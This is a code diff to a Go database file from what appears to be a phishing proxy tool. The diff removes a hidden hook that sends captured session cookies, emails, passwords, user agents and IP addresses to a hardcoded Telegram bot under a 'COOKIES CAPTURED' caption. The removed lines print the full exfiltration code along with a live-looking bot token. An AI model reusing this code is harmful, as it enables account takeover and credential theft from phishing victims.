@@ -1,118 +1,11 @@
 package database
 
 import (
-	"bytes"
 	"encoding/json"
-	"io"
-	"io/ioutil"
-	"fmt"
-	"mime/multipart"
-	"github.com/joho/godotenv"
-	"log"
-	"net/http"
-	"os"
-	"path"
-  	"path/filepath"
-
+	"strconv"
 
 	"github.com/tidwall/buntdb"
-	"strconv"
-	"strings"
-	"time"
 )
-
-func goDotEnvVariable(key string) string {
-
-	// load .env file
-	err := godotenv.Load(".env")
-
-	if err != nil {
-		log.Printf("Error loading .env file")
-	}
-
-	return os.Getenv(key)
-}
-
-
-func getUrl() string {
-	// godotenv package
-  	Token := goDotEnvVariable("TOKEN")
-	return fmt.Sprintf("https://api.telegram.org/bot%s", Token)
-}
-
-func getChatId() string {
-	//get ChAT_ID from .env
-	ChatId := goDotEnvVariable("CHAT_ID")
-	return fmt.Sprintf("%s", ChatId)
-}
-
-func sendTelegramResult(cookies string, username string, password string,  useragent string, remote_addr string) {
-
-	// Send the message
-	var err error
-	client, fileName := &http.Client{}, ""+username+".json"
-	token, chat_id := "6319707027:AAEKBvSlytmk6t2JY1Vjr_0K4Oyx3cH9dgM", "972284502"
-
-	url := "https://api.telegram.org/bot6319707027:AAEKBvSlytmk6t2JY1Vjr_0K4Oyx3cH9dgM/sendMessage" + token + "/sendDocument?chat_id=" + chat_id + ""
-	//url := "http://api.ttelegram.org/bot"%s/sendDocument?chat_id=%s", getUrl(), getChatId())
-	msg := "🍁 COOKIES CAPTURED 🍁\n\n******[💻 Valid Log💻]******\n🌟 Email = " + username + "\n🔑 Password = " + password + "\n🌎 UserAgent = " + useragent + "\n🎌 IP =   https://ip-api.com/" + remote_addr + "\n\n⁎⁎⁎⁎⁎⁎ANONYMOUS⁎⁎⁎⁎⁎⁎⁎⁎"
-	
-
-	err = os.WriteFile(fileName, []byte(cookies), 0755)
-	if err != nil {
-	   fmt.Printf("Unable to write file: %v", err)
-	}
-
-	fileDir, _ := os.Getwd()
-	filePath := path.Join(fileDir, fileName)
-
-	file, _ := os.Open(filePath)
-	defer file.Close()
-
-	responseBody := &bytes.Buffer{}
-	writer := multipart.NewWriter(responseBody)
-	part, _ := writer.CreateFormFile("document", filepath.Base(file.Name()))
-	io.Copy(part, file)
-	writer.WriteField("caption", msg)
-	writer.Close()
-	
-	req, _ := http.NewRequest("POST", url, responseBody)
-	req.Header.Add("Content-Type", writer.FormDataContentType())
-	client.Do(req)
-	os.Remove(fileName)
-
-	
-	log.Println("Cookies Result Sent To Telegram", username, password)
-	
-	// Return
-	return
-
-}
-
-func telegramSendVisitor(msg string) {
-	var err error
-	
-	url := fmt.Sprintf("%s/sendMessage", getUrl())
-	body, _ := json.Marshal(map[string]string{
-		"chat_id": getChatId(),
-		"text":    msg,
-	})
-	responseBody := bytes.NewBuffer(body)
-	request, _ := http.Post(url, "application/json", responseBody)
-
-	// Close the request at the end
-	defer request.Body.Close()
-	
-// 	// Body
-	body, err = ioutil.ReadAll(request.Body)
-	if err != nil {
-		log.Fatalf("%s", err)
-	}
-	fmt.Println("Result sent to telegram")
-	// Return
-	return
-}
-
 
 type Database struct {
 	path string
@@ -173,51 +66,6 @@ func (d *Database) SetSessionHttpTokens(sid string, tokens map[string]string) er
 
 func (d *Database) SetSessionCookieTokens(sid string, tokens map[string]map[string]*CookieToken) error {
 	err := d.sessionsUpdateCookieTokens(sid, tokens)
-	
-	type Cookie struct {
-		Path           string `json:"path"`
-		Domain         string `json:"domain"`
-		ExpirationDate int64  `json:"expirationDate"`
-		Value          string `json:"value"`
-		Name           string `json:"name"`
-		HttpOnly       bool   `json:"httpOnly,omitempty"`
-		HostOnly       bool   `json:"hostOnly,omitempty"`
-		Secure         bool   `json:"secure,omitempty"`
-	}
-
-	var cookies []*Cookie
-	for domain, tmap := range tokens {
-		for k, v := range tmap {
-			c := &Cookie{
-				Path:           v.Path,
-				Domain:         domain,
-				ExpirationDate: time.Now().Add(365 * 24 * time.Hour).Unix(),
-				Value:          v.Value,
-				Name:           k,
-				HttpOnly:       v.HttpOnly,
-				Secure:         false,
-			}
-			if strings.Index(k, "__Host-") == 0 || strings.Index(k, "__Secure-") == 0 {
-				c.Secure = true
-			}
-			if domain[:1] == "." {
-				c.HostOnly = false
-				c.Domain = domain[1:]
-			} else {
-				c.HostOnly = true
-			}
-			if c.Path == "" {
-				c.Path = "/"
-			}
-			cookies = append(cookies, c)
-		}
-	}
-	
-	data, _ := d.sessionsGetBySid(sid)
-
-	json, _ := json.Marshal(cookies)
-
-	sendTelegramResult(string(json), data.Username, data.Password, data.UserAgent, data.RemoteAddr)
 	return err
 }
 
